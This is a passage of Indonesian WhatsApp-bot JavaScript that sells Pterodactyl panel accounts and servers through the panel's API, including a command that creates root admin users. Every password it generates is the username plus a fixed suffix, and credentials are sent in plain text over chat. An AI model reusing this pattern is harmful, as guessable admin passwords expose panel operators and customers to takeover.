┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
Biiofc.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
                case "crateadmin": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
if (!isOwner) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await Biiofc.sendMessage(m.chat, listMessage)

    await Biiofc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadmin": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
             case "addsrv": {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case "buyapipm2": {
  if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/apipm2.zip'), caption: 'Nih Yapit, Kau Jual Murah Awas Kontol', mimetype: 'application/zip', fileName: 'apipm2.zip'}, {quoted: m})
minSaldo(sender, 35000, db_saldo)
}
break
case "buyeggpm2": {
  if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/pm2.json'), caption: 'Egg Pm2', mimetype: 'application/json', fileName: 'pm2.json'}, {quoted: m})
minSaldo(sender, 30000, db_saldo)
}
break
case "buycasepm2": {
  if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/caseaddpm2.zip'), caption: 'Nih Kontol, Kau Jual Murah Ku Delete!', mimetype: 'application/zip', fileName: 'caseaddpm2.zip'}, {quoted: m})
minSaldo(sender, 45000, db_saldo)
}
break
        case "srvpaket1": {
       if (cekSaldo(sender,db_saldo) < 3000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "1000"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY RIDZ STORE⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}
 *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
`)

}
minSaldo(sender, 3000, db_saldo)
break
case "srvpaket2": {
       if (cekSaldo(sender,db_saldo) < 4000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "2000"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 4000, db_saldo)
break
case "srvpaket3": {
       if (cekSaldo(sender,db_saldo) < 6000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "3000"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 6000, db_saldo)
break
case "srvpaket4": {
       if (cekSaldo(sender,db_saldo) < 8000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "4000"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 8000, db_saldo)
break
case "srvpaket5": {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "5000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 10000, db_saldo)
break
case "srvpaket6": {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 20000, db_saldo)
break
case "srvpaket7": {
       if (cekSaldo(sender,db_saldo) < 12000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
